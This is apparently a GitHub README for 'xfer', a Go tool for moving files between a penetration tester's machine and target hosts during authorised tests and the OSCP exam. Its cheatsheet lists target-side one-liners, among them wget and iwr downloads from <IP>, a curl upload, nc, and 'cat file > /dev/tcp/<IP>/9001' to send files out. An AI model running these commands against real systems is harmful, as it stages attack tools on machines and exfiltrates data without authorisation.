# xfer

A standalone Go binary designed for rapid, bidirectional file transfers during penetration testing and the OSCP exam. It eliminates the need to memorize transfer syntax or manage complex local server configurations. 

`xfer` natively implements HTTP and TCP servers and wraps standard Kali Linux tools for SMB and FTP. It automatically binds to the specified network interface and outputs copy-paste execution commands for both Linux and Windows targets.

## Features
* **Single Binary:** Compiled in Go to prevent Python environment breakages.
* **Syntax Generation:** Dynamically generates target execution commands using the correct local IP.
* **Native HTTP & TCP:** Implements HTTP (download/upload) and raw TCP natively without external dependencies.
* **Service Wrapping:** Acts as a centralized wrapper for `impacket-smbserver` and `pyftpdlib`.

## Prerequisites
Ensure the following dependencies are installed on the host machine (standard on Kali Linux):
* `go` (for compilation)
* `impacket-smbserver` (for SMB wrapping)
* `python3-pyftpdlib` (for FTP wrapping)

Install missing Python dependencies via the system package manager:
```bash
sudo apt update
sudo apt install python3-impacket python3-pyftpdlib
```

## Installation

Clone the repository and compile the binary:

```bash
git clone https://github.com/adityakamalsharma/xfer.git
cd xfer
go mod init xfer
go build -ldflags="-s -w" -o xfer xfer.go
sudo mv xfer /usr/local/bin/
```

## Usage

Run the tool with root privileges (if binding to privileged ports like 21, 80, or 445).

```bash
sudo xfer -p <protocol> [-i <interface>] [-port <custom_port>]
```

| Flag | Description | Default |
| --- | --- | --- |
| `-p` | Protocol to start (`http`, `smb`, `ftp`, `tcp`, `scp`) | `http` |
| `-i` | Network interface to extract IP (`tun0`, `eth0`, `lo`) | `tun0` |
| `-port` | Custom port override | Varies by protocol |

## Cheatsheet


| Protocol | Local Command            | Target Download (Local -> Target)                                                                        | Target Upload (Target -> Local)                      |
| -------- | ------------------------ | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| **HTTP** | `sudo xfer -p http`      | **Linux:** `wget http://<IP>/file -O file`<br><br>  <br><br>**Win:** `iwr -uri http://<IP>/file -o file` | **Linux:** `curl -F 'file=@file' http://<IP>/upload` |
| **SMB**  | `sudo xfer -p smb`       | **Win:** `copy \\<IP>\share\file .`                                                                      | **Win:** `copy file \\<IP>\share\`                   |
| **FTP**  | `sudo xfer -p ftp`       | **Linux/Win:** `ftp <IP>` (anonymous/blank)                                                              | **Linux/Win:** `ftp <IP>` -> `put file`              |
| **TCP**  | `xfer -p tcp -port 9001` | **Linux:** `nc <IP> 9001 > file`                                                                         | **Linux:** `cat file > /dev/tcp/<IP>/9001`           |
| **SCP**  | `sudo xfer -p scp`       | **Linux:** `scp kali@<IP>:/path/to/file .`                                                               | **Linux:** `scp file kali@<IP>:/tmp/`                |


*Note: Replace `<IP>` and `file` with the parameters generated by the tool output in your terminal.*
